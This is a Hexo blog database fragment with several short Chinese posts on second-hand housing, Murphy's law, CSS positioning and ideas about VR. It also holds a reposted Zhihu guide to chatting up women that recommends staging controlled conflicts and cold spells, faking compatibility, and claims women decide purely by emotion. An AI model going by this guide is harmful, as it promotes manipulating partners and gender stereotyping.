class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n"},{"title":"二手房注意点","date":"2018-05-21T02:25:38.000Z","_content":"\n## 购买二手房需要注意点\n\n房屋取得年限\n\n是否唯一住房\n\n原值\n\n关注微信公众号[有律在线]\n---\n[阅读原文](https://baike.baidu.com/item/%E4%BA%8C%E6%89%8B%E6%88%BF/341764?secondId=474866)","source":"_posts/二手房注意点.md","raw":"---\ntitle: 二手房注意点\ndate: 2018-05-21 10:25:38\ntags: 二手房\ncategories: 二手房\n---\n\n## 购买二手房需要注意点\n\n房屋取得年限\n\n是否唯一住房\n\n原值\n\n关注微信公众号[有律在线]\n---\n[阅读原文](https://baike.baidu.com/item/%E4%BA%8C%E6%89%8B%E6%88%BF/341764?secondId=474866)","slug":"二手房注意点","published":1,"updated":"2018-05-21T02:28:46.852Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i26u0006b8xjsiyn070b","content":"<h2 id=\"购买二手房需要注意点\"><a href=\"#购买二手房需要注意点\" class=\"headerlink\" title=\"购买二手房需要注意点\"></a>购买二手房需要注意点</h2><p>房屋取得年限</p>\n<p>是否唯一住房</p>\n<p>原值</p>\n<h2 id=\"关注微信公众号-有律在线\"><a href=\"#关注微信公众号-有律在线\" class=\"headerlink\" title=\"关注微信公众号[有律在线]\"></a>关注微信公众号[有律在线]</h2><p><a href=\"https://baike.baidu.com/item/%E4%BA%8C%E6%89%8B%E6%88%BF/341764?secondId=474866\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"购买二手房需要注意点\"><a href=\"#购买二手房需要注意点\" class=\"headerlink\" title=\"购买二手房需要注意点\"></a>购买二手房需要注意点</h2><p>房屋取得年限</p>\n<p>是否唯一住房</p>\n<p>原值</p>\n<h2 id=\"关注微信公众号-有律在线\"><a href=\"#关注微信公众号-有律在线\" class=\"headerlink\" title=\"关注微信公众号[有律在线]\"></a>关注微信公众号[有律在线]</h2><p><a href=\"https://baike.baidu.com/item/%E4%BA%8C%E6%89%8B%E6%88%BF/341764?secondId=474866\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"墨菲法则","date":"2018-05-08T07:57:57.000Z","archives":"法则","_content":"## 凡是可能会出错的地方，一定会出错！—— 墨菲法则","source":"_posts/墨菲法则.md","raw":"---\ntitle: 墨菲法则\ndate: 2018-05-08 15:57:57\ntags: 座右铭系列\narchives: 法则\ncategories: 日常随笔\n---\n## 凡是可能会出错的地方，一定会出错！—— 墨菲法则","slug":"墨菲法则","published":1,"updated":"2018-05-08T08:00:39.411Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i26w000ab8xjmvc8zk4f","content":"<h2 id=\"凡是可能会出错的地方，一定会出错！——-墨菲法则\"><a href=\"#凡是可能会出错的地方，一定会出错！——-墨菲法则\" class=\"headerlink\" title=\"凡是可能会出错的地方，一定会出错！—— 墨菲法则\"></a>凡是可能会出错的地方，一定会出错！—— 墨菲法则</h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"凡是可能会出错的地方，一定会出错！——-墨菲法则\"><a href=\"#凡是可能会出错的地方，一定会出错！——-墨菲法则\" class=\"headerlink\" title=\"凡是可能会出错的地方，一定会出错！—— 墨菲法则\"></a>凡是可能会出错的地方，一定会出错！—— 墨菲法则</h2>"},{"title":"子元素居于父元素底部","date":"2018-05-18T06:45:26.000Z","_content":"只要父元素的`posiiton`设置为`relative`，子元素的位置就是相对于父元素的，这样设置子元素的`bottom`为`0`，即可将子元素置于父元素底部。\n````\n.parent{  \n    position: relative;  \n    width:200px;  \n    height: 100px;  \n    background: dodgerblue;  \n}  \n.content{  \n    position: absolute;  \n    width: 200px;  \n    height: 30px;  \n    background: orange;  \n    bottom: 0;  \n}  \n````","source":"_posts/子元素居于父元素底部.md","raw":"---\ntitle: 子元素居于父元素底部\ndate: 2018-05-18 14:45:26\ntags: 绝对定位\ncategories: CSS\n---\n只要父元素的`posiiton`设置为`relative`，子元素的位置就是相对于父元素的，这样设置子元素的`bottom`为`0`，即可将子元素置于父元素底部。\n````\n.parent{  \n    position: relative;  \n    width:200px;  \n    height: 100px;  \n    background: dodgerblue;  \n}  \n.content{  \n    position: absolute;  \n    width: 200px;  \n    height: 30px;  \n    background: orange;  \n    bottom: 0;  \n}  \n````","slug":"子元素居于父元素底部","published":1,"updated":"2018-05-18T06:47:03.696Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i26y000bb8xjgyix6o8a","content":"<p>只要父元素的<code>posiiton</code>设置为<code>relative</code>，子元素的位置就是相对于父元素的，这样设置子元素的<code>bottom</code>为<code>0</code>，即可将子元素置于父元素底部。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.parent&#123;  </span><br><span class=\"line\">    position: relative;  </span><br><span class=\"line\">    width:200px;  </span><br><span class=\"line\">    height: 100px;  </span><br><span class=\"line\">    background: dodgerblue;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">.content&#123;  </span><br><span class=\"line\">    position: absolute;  </span><br><span class=\"line\">    width: 200px;  </span><br><span class=\"line\">    height: 30px;  </span><br><span class=\"line\">    background: orange;  </span><br><span class=\"line\">    bottom: 0;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>只要父元素的<code>posiiton</code>设置为<code>relative</code>，子元素的位置就是相对于父元素的，这样设置子元素的<code>bottom</code>为<code>0</code>，即可将子元素置于父元素底部。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.parent&#123;  </span><br><span class=\"line\">    position: relative;  </span><br><span class=\"line\">    width:200px;  </span><br><span class=\"line\">    height: 100px;  </span><br><span class=\"line\">    background: dodgerblue;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">.content&#123;  </span><br><span class=\"line\">    position: absolute;  </span><br><span class=\"line\">    width: 200px;  </span><br><span class=\"line\">    height: 30px;  </span><br><span class=\"line\">    background: orange;  </span><br><span class=\"line\">    bottom: 0;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"改变世界的想法","date":"2018-06-08T07:48:33.000Z","_content":"在当下的宇宙中，目前人类科技，两大难题。时间 和 空间\n\n改变世界的方法一：类似《头号玩家》的虚拟现实，解决 空间问题，缩短时间问题。\n\n具体技术：VR、人脸识别、微表情、触觉感应器\n\n改变世界的方法二：物理硬件 的飞行器。降低成本，解放人类空间自由度。\n\n","source":"_posts/改变世界的想法.md","raw":"---\ntitle: 改变世界的想法\ndate: 2018-06-08 15:48:33\ntags:\ncategories: Change the world\n---\n在当下的宇宙中，目前人类科技，两大难题。时间 和 空间\n\n改变世界的方法一：类似《头号玩家》的虚拟现实，解决 空间问题，缩短时间问题。\n\n具体技术：VR、人脸识别、微表情、触觉感应器\n\n改变世界的方法二：物理硬件 的飞行器。降低成本，解放人类空间自由度。\n\n","slug":"改变世界的想法","published":1,"updated":"2018-06-08T07:58:18.561Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i270000fb8xj8gnxougc","content":"<p>在当下的宇宙中，目前人类科技，两大难题。时间 和 空间</p>\n<p>改变世界的方法一：类似《头号玩家》的虚拟现实，解决 空间问题，缩短时间问题。</p>\n<p>具体技术：VR、人脸识别、微表情、触觉感应器</p>\n<p>改变世界的方法二：物理硬件 的飞行器。降低成本，解放人类空间自由度。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在当下的宇宙中，目前人类科技，两大难题。时间 和 空间</p>\n<p>改变世界的方法一：类似《头号玩家》的虚拟现实，解决 空间问题，缩短时间问题。</p>\n<p>具体技术：VR、人脸识别、微表情、触觉感应器</p>\n<p>改变世界的方法二：物理硬件 的飞行器。降低成本，解放人类空间自由度。</p>\n"},{"title":"撩妹套路","date":"2018-05-07T05:46:33.000Z","archives":"撩妹套路","_content":"## 转载知乎[聊天套路](https://www.zhihu.com/question/47029505/answer/256114477)\n## 写在前面的话：\n聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。\n\n从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。\n\n但这并不是一切，\n\n## 1.寻找切入话题\n通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。\n\n例一：你发现\\\n①：她喜欢听周杰伦。\\\n②：她喜欢听万青。\\\n③：她喜欢打羽毛球。\\\n④：她喜欢美剧。\\\n⑤：她讨厌鹿晗。\\\n⑥：她讨厌不清不楚的男女暧昧关系。\\\n⑦：她特别不喜欢吃菠萝。\\\n⑧：她有每天起床后喝一杯热水的习惯。\\\n⑨：她有每天晚上跑步的习惯。\n\n你会选择哪个话题切入呢？\\\n正确答案是②、④、⑥、⑧。\\\n前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。\n\n当然其它选项也不要忘了、在后期仍然有很大的用处。\n\n## 2.负起带节奏的重担\n①：`知识面`要广、不必什么都懂、但什么你都能说上两句。\\\n②：`有趣机智`、`脑回路清奇`以求`脱颖而出`、这里考验的是`段子储备`量和`临场反应`。烂大街的梗就不要用了、只会让你显得更加无趣。`前期`幽默的形式以自黑为主、`中后期`以黑她为主、当然是不伤大雅的那种黑。\\\n③：`前期`做一个合格的`捧哏`，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。`中后期`做一个合格的`逗哏`、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\\n④：拒绝`尬聊`。在发现话题进行不下去的时候、请找个`借口赶紧溜`了、再多说一句都可能会死。\\\n⑤：`换位思考`。你打出一行字后或准备说出一句话时、先把自己`带入`到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\\n⑥：`先人一步`。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\\n⑦：可以给她一个`专属代称`、就是只有你才会那么叫她的那种。\\\n⑧：从以前的聊天记录或面谈中找到几个`有趣的梗`、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\\n⑨：无论如何、一定要`尊重`她、开玩笑要懂得`分寸`、这是`底线`。\n\n## 3.控场\n①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古`表白多白表`、从来`姻缘少原因`。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\\n②：`前期`你可以每天主动聊天、但到`中后期`一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\\n③：制造`完全可控`的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\\n④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。\n\n**例二**：\\\n一起出去玩，要`买水果`。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。\n\n`心理距离`很重要、太冒进会容易让女生起戒备心。\n\n你只要一下走`进`了太多就一定要在合适的时候后`退`一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。\n\n## 4.鸣金收兵\n女生以情绪为导向做出决定。\n\n一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。\n\n直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。\n\n但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。\n\n## 写在后面的话\n如果你已经追上心爱的女孩了。\n\n可你的噩梦才刚刚开始\n\n追女生容易, 经营、运行一段恋情走下去才是最难的。","source":"_posts/撩妹套路.md","raw":"---\ntitle: 撩妹套路\ndate: 2018-05-07 13:46:33\ntags: 感情\narchives: 撩妹套路\ncategories: 感情\n---\n## 转载知乎[聊天套路](https://www.zhihu.com/question/47029505/answer/256114477)\n## 写在前面的话：\n聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。\n\n从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。\n\n但这并不是一切，\n\n## 1.寻找切入话题\n通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。\n\n例一：你发现\\\n①：她喜欢听周杰伦。\\\n②：她喜欢听万青。\\\n③：她喜欢打羽毛球。\\\n④：她喜欢美剧。\\\n⑤：她讨厌鹿晗。\\\n⑥：她讨厌不清不楚的男女暧昧关系。\\\n⑦：她特别不喜欢吃菠萝。\\\n⑧：她有每天起床后喝一杯热水的习惯。\\\n⑨：她有每天晚上跑步的习惯。\n\n你会选择哪个话题切入呢？\\\n正确答案是②、④、⑥、⑧。\\\n前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。\n\n当然其它选项也不要忘了、在后期仍然有很大的用处。\n\n## 2.负起带节奏的重担\n①：`知识面`要广、不必什么都懂、但什么你都能说上两句。\\\n②：`有趣机智`、`脑回路清奇`以求`脱颖而出`、这里考验的是`段子储备`量和`临场反应`。烂大街的梗就不要用了、只会让你显得更加无趣。`前期`幽默的形式以自黑为主、`中后期`以黑她为主、当然是不伤大雅的那种黑。\\\n③：`前期`做一个合格的`捧哏`，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。`中后期`做一个合格的`逗哏`、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\\n④：拒绝`尬聊`。在发现话题进行不下去的时候、请找个`借口赶紧溜`了、再多说一句都可能会死。\\\n⑤：`换位思考`。你打出一行字后或准备说出一句话时、先把自己`带入`到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\\n⑥：`先人一步`。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\\n⑦：可以给她一个`专属代称`、就是只有你才会那么叫她的那种。\\\n⑧：从以前的聊天记录或面谈中找到几个`有趣的梗`、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\\n⑨：无论如何、一定要`尊重`她、开玩笑要懂得`分寸`、这是`底线`。\n\n## 3.控场\n①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古`表白多白表`、从来`姻缘少原因`。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\\n②：`前期`你可以每天主动聊天、但到`中后期`一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\\n③：制造`完全可控`的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\\n④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。\n\n**例二**：\\\n一起出去玩，要`买水果`。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。\n\n`心理距离`很重要、太冒进会容易让女生起戒备心。\n\n你只要一下走`进`了太多就一定要在合适的时候后`退`一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。\n\n## 4.鸣金收兵\n女生以情绪为导向做出决定。\n\n一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。\n\n直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。\n\n但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。\n\n## 写在后面的话\n如果你已经追上心爱的女孩了。\n\n可你的噩梦才刚刚开始\n\n追女生容易, 经营、运行一段恋情走下去才是最难的。","slug":"撩妹套路","published":1,"updated":"2018-05-07T06:39:59.566Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i272000hb8xje240zghv","content":"<h2 id=\"转载知乎聊天套路\"><a href=\"#转载知乎聊天套路\" class=\"headerlink\" title=\"转载知乎聊天套路\"></a>转载知乎<a href=\"https://www.zhihu.com/question/47029505/answer/256114477\" target=\"_blank\" rel=\"noopener\">聊天套路</a></h2><h2 id=\"写在前面的话：\"><a href=\"#写在前面的话：\" class=\"headerlink\" title=\"写在前面的话：\"></a>写在前面的话：</h2><p>聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。</p>\n<p>从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。</p>\n<p>但这并不是一切，</p>\n<h2 id=\"1-寻找切入话题\"><a href=\"#1-寻找切入话题\" class=\"headerlink\" title=\"1.寻找切入话题\"></a>1.寻找切入话题</h2><p>通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。</p>\n<p>例一：你发现\\<br>①：她喜欢听周杰伦。\\<br>②：她喜欢听万青。\\<br>③：她喜欢打羽毛球。\\<br>④：她喜欢美剧。\\<br>⑤：她讨厌鹿晗。\\<br>⑥：她讨厌不清不楚的男女暧昧关系。\\<br>⑦：她特别不喜欢吃菠萝。\\<br>⑧：她有每天起床后喝一杯热水的习惯。\\<br>⑨：她有每天晚上跑步的习惯。</p>\n<p>你会选择哪个话题切入呢？\\<br>正确答案是②、④、⑥、⑧。\\<br>前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。</p>\n<p>当然其它选项也不要忘了、在后期仍然有很大的用处。</p>\n<h2 id=\"2-负起带节奏的重担\"><a href=\"#2-负起带节奏的重担\" class=\"headerlink\" title=\"2.负起带节奏的重担\"></a>2.负起带节奏的重担</h2><p>①：<code>知识面</code>要广、不必什么都懂、但什么你都能说上两句。\\<br>②：<code>有趣机智</code>、<code>脑回路清奇</code>以求<code>脱颖而出</code>、这里考验的是<code>段子储备</code>量和<code>临场反应</code>。烂大街的梗就不要用了、只会让你显得更加无趣。<code>前期</code>幽默的形式以自黑为主、<code>中后期</code>以黑她为主、当然是不伤大雅的那种黑。\\<br>③：<code>前期</code>做一个合格的<code>捧哏</code>，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。<code>中后期</code>做一个合格的<code>逗哏</code>、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\<br>④：拒绝<code>尬聊</code>。在发现话题进行不下去的时候、请找个<code>借口赶紧溜</code>了、再多说一句都可能会死。\\<br>⑤：<code>换位思考</code>。你打出一行字后或准备说出一句话时、先把自己<code>带入</code>到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\<br>⑥：<code>先人一步</code>。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\<br>⑦：可以给她一个<code>专属代称</code>、就是只有你才会那么叫她的那种。\\<br>⑧：从以前的聊天记录或面谈中找到几个<code>有趣的梗</code>、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\<br>⑨：无论如何、一定要<code>尊重</code>她、开玩笑要懂得<code>分寸</code>、这是<code>底线</code>。</p>\n<h2 id=\"3-控场\"><a href=\"#3-控场\" class=\"headerlink\" title=\"3.控场\"></a>3.控场</h2><p>①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古<code>表白多白表</code>、从来<code>姻缘少原因</code>。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\<br>②：<code>前期</code>你可以每天主动聊天、但到<code>中后期</code>一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\<br>③：制造<code>完全可控</code>的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\<br>④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。</p>\n<p><strong>例二</strong>：\\<br>一起出去玩，要<code>买水果</code>。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。</p>\n<p><code>心理距离</code>很重要、太冒进会容易让女生起戒备心。</p>\n<p>你只要一下走<code>进</code>了太多就一定要在合适的时候后<code>退</code>一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。</p>\n<h2 id=\"4-鸣金收兵\"><a href=\"#4-鸣金收兵\" class=\"headerlink\" title=\"4.鸣金收兵\"></a>4.鸣金收兵</h2><p>女生以情绪为导向做出决定。</p>\n<p>一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。</p>\n<p>直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。</p>\n<p>但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。</p>\n<h2 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h2><p>如果你已经追上心爱的女孩了。</p>\n<p>可你的噩梦才刚刚开始</p>\n<p>追女生容易, 经营、运行一段恋情走下去才是最难的。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转载知乎聊天套路\"><a href=\"#转载知乎聊天套路\" class=\"headerlink\" title=\"转载知乎聊天套路\"></a>转载知乎<a href=\"https://www.zhihu.com/question/47029505/answer/256114477\" target=\"_blank\" rel=\"noopener\">聊天套路</a></h2><h2 id=\"写在前面的话：\"><a href=\"#写在前面的话：\" class=\"headerlink\" title=\"写在前面的话：\"></a>写在前面的话：</h2><p>聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。</p>\n<p>从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。</p>\n<p>但这并不是一切，</p>\n<h2 id=\"1-寻找切入话题\"><a href=\"#1-寻找切入话题\" class=\"headerlink\" title=\"1.寻找切入话题\"></a>1.寻找切入话题</h2><p>通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。</p>\n<p>例一：你发现\\<br>①：她喜欢听周杰伦。\\<br>②：她喜欢听万青。\\<br>③：她喜欢打羽毛球。\\<br>④：她喜欢美剧。\\<br>⑤：她讨厌鹿晗。\\<br>⑥：她讨厌不清不楚的男女暧昧关系。\\<br>⑦：她特别不喜欢吃菠萝。\\<br>⑧：她有每天起床后喝一杯热水的习惯。\\<br>⑨：她有每天晚上跑步的习惯。</p>\n<p>你会选择哪个话题切入呢？\\<br>正确答案是②、④、⑥、⑧。\\<br>前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。</p>\n<p>当然其它选项也不要忘了、在后期仍然有很大的用处。</p>\n<h2 id=\"2-负起带节奏的重担\"><a href=\"#2-负起带节奏的重担\" class=\"headerlink\" title=\"2.负起带节奏的重担\"></a>2.负起带节奏的重担</h2><p>①：<code>知识面</code>要广、不必什么都懂、但什么你都能说上两句。\\<br>②：<code>有趣机智</code>、<code>脑回路清奇</code>以求<code>脱颖而出</code>、这里考验的是<code>段子储备</code>量和<code>临场反应</code>。烂大街的梗就不要用了、只会让你显得更加无趣。<code>前期</code>幽默的形式以自黑为主、<code>中后期</code>以黑她为主、当然是不伤大雅的那种黑。\\<br>③：<code>前期</code>做一个合格的<code>捧哏</code>，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。<code>中后期</code>做一个合格的<code>逗哏</code>、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\<br>④：拒绝<code>尬聊</code>。在发现话题进行不下去的时候、请找个<code>借口赶紧溜</code>了、再多说一句都可能会死。\\<br>⑤：<code>换位思考</code>。你打出一行字后或准备说出一句话时、先把自己<code>带入</code>到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\<br>⑥：<code>先人一步</code>。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\<br>⑦：可以给她一个<code>专属代称</code>、就是只有你才会那么叫她的那种。\\<br>⑧：从以前的聊天记录或面谈中找到几个<code>有趣的梗</code>、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\<br>⑨：无论如何、一定要<code>尊重</code>她、开玩笑要懂得<code>分寸</code>、这是<code>底线</code>。</p>\n<h2 id=\"3-控场\"><a href=\"#3-控场\" class=\"headerlink\" title=\"3.控场\"></a>3.控场</h2><p>①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古<code>表白多白表</code>、从来<code>姻缘少原因</code>。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\<br>②：<code>前期</code>你可以每天主动聊天、但到<code>中后期</code>一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\<br>③：制造<code>完全可控</code>的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\<br>④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。</p>\n<p><strong>例二</strong>：\\<br>一起出去玩，要<code>买水果</code>。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。</p>\n<p><code>心理距离</code>很重要、太冒进会容易让女生起戒备心。</p>\n<p>你只要一下走<code>进</code>了太多就一定要在合适的时候后<code>退</code>一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。</p>\n<h2 id=\"4-鸣金收兵\"><a href=\"#4-鸣金收兵\" class=\"headerlink\" title=\"4.鸣金收兵\"></a>4.鸣金收兵</h2><p>女生以情绪为导向做出决定。</p>\n<p>一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。</p>\n<p>直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。</p>\n<p>但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。</p>\n<h2 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h2><p>如果你已经追上心爱的女孩了。</p>\n<p>可你的噩梦才刚刚开始</p>\n<p>追女生容易, 经营、运行一段恋情走下去才是最难的。</p>\n"},{"title":"日常随笔","date":"2015-05-01T02:31:27.000Z","_content":"# 关于写blog的意义\n\n博客日志相当于一个日常记事本，可以理解为日记，学习笔记。\n\n工作的状态也是属于不停学习的状态，在我们遇到问题的时候，大脑进行思考，以及运用互联网解决问题的过程，都会收获 想法 与 知识。\n\n俗话说：好记性不如烂笔头。在保持勤思考的同时，也应该及时做记录。\n\n罗辑思维《如何成为一个高手》里讲到: 钱钟书虽然是响当当的文学家，但是家里是没有多少藏书的 ( 相对而言，不可片面认知 ) ，更多的是记笔记的笔记本。\n\n这就说明我们不应该以 `收集知识的总量` 来衡量 一个人的学识，而是应该判断 一个人 `掌握知识的总量` 